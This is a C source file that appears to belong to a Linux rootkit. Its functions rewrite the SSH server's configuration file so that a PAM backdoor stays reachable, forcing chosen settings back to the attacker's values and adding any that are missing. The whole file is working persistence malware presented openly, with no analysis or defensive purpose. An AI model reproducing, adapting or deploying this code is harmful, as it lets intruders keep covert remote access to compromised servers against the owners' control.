/*
 *   the following functions handle all of the work for patching sshd_config
 *   to make sure the PAM backdoor is accessible, AND STAYS THAT WAY.
 */

void addsetting(char *setting, char *value, char **buf){
    // add "<Setting> <Desired value>\n"
    char tmp[strlen(setting) + strlen(value) + 4];
    memset(tmp, 0, sizeof(tmp));
    snprintf(tmp, sizeof(tmp), "%s %s\n", setting, value);
    strcat(*buf, tmp);
}

size_t writesshd(char *buf){
    FILE *fp;
    size_t count;
    hook(CFOPEN, CFWRITE);

    fp = call(CFOPEN, SSHD_CONFIG, "w");
    if(fp == NULL) return -1;
    count = (size_t)call(CFWRITE, buf, 1, strlen(buf), fp);
    
    fflush(fp);
    fclose(fp);
    return count;
}

/* this function reads sshd_config. if we can open it for reading, memory is allocated for it.
 *
 * each line is checked individually for bad settings.
 * the integer array 'res' contains statuses for the following outcomes of target settings:
 *   if a setting is spotted on the line & it is bad, the line is substituted for a more desireable setting of our own.
 *   if a setting is spotted on the line & it is ok, nothing is done to it.
 * if neither outcomes are met, it is assumed that the setting is missing & that we need to write in a new line for it ourselves. */
int sshdok(int res[], char **buf, size_t *sshdsize){
    hook(CFOPEN, C__XSTAT);

    // stat sshd_config so we can get the filesize.
    struct stat sshdstat;
    memset(&sshdstat, 0, sizeof(struct stat));
    int statstat = (long)call(C__XSTAT, _STAT_VER, SSHD_CONFIG, &sshdstat);
    if(statstat < 0) // nopenopenope
        return -1;

    FILE *fp; // FILE pointer for reading of sshd_config.
    char *curtarget,     // contains the current setting to patch.
         *cursettingval, // contains the value of the current setting.
         line[LINE_MAX], // buffer for current line of sshd_config.
         *linedup;       // copy of line buffer so we can strtok on it safely to get setting value.
    size_t targetlen;  // length of the current target setting.
    int skipline = 0;  // indicates whether or not to skip current line from file.

    fp = call(CFOPEN, SSHD_CONFIG, "r");
    if(fp == NULL)
        return -1;

    // file opened for reading ok. now allocate memory for it.
    *sshdsize = sshdstat.st_size;
#ifdef MAX_SSHD_SIZE
    if(*sshdsize > MAX_SSHD_SIZE)
        *sshdsize = MAX_SSHD_SIZE;
#endif

    *sshdsize += 45; // +45 bytes for possible additions of our own...
    *buf = malloc(*sshdsize);
    memset(*buf, 0, *sshdsize);
    
    while(fgets(line, sizeof(line), fp) != NULL){
        /* lines are cool. unless they aren't... */
        skipline = 0;

        for(int i = 0; i != PATCHTARGETS_SIZE; i++){
            if(res[i] == 2 || res[i] == 1) // status of setting already determined. next.
                continue;

            /* curtarget is a specific setting within sshd_config
             * that we want to remain to our liking. no matter what. */
            curtarget = patchtargets[i];
            targetlen = strlen(curtarget);

            /* check current line starts with a target setting to patch. */
            if(!strncmp(line, curtarget, targetlen)){
                linedup = strdup(line);

                // get the option from the line.
                cursettingval = strtok(linedup, " ");
                cursettingval = strtok(NULL, " "); // theoretically this will/should be "yes" or "no"

                /* check current setting value against values we don't want. */
                if(strstr(cursettingval, antival[i])){
                    addsetting(curtarget, targetval[i], buf);
                    skipline = 1;
                    res[i] = 2;
                    free(linedup);
                    break;
                }

                res[i] = 1;    // target setting is ok the way it is.
                free(linedup);
                break;
            }
        }

        if(!skipline) // if line is cool, line is cool.
            strcat(*buf, line);
    }
    fclose(fp);

    return 1;
}

/*
 *    this function does the actual writing of the patched sshd config.
 *    plus the addition of settings that were previously missing.
 */

void sshdpatch(void){
    char *sshdcontents; // stores contents of sshd_config.
    size_t sshdsize;    // stores filesize of sshd_config.
    int status[PATCHTARGETS_SIZE]; // stores patch status of each setting.

    if(sshdok(status, &sshdcontents, &sshdsize) < 0)
        return;

    int nook = 0,       // number of settings that returned 'ok' (1).
        nopatched = 0;  // number of settings whose values have been patched. (2)

    for(int i = 0; i != PATCHTARGETS_SIZE; i++){
        if(status[i] == 1) nook++;
        else if(status[i] == 2) nopatched++;
        else addsetting(patchtargets[i], targetval[i], &sshdcontents);
    }

    if(nook != PATCHTARGETS_SIZE)
        writesshd(sshdcontents);

    free(sshdcontents);
}
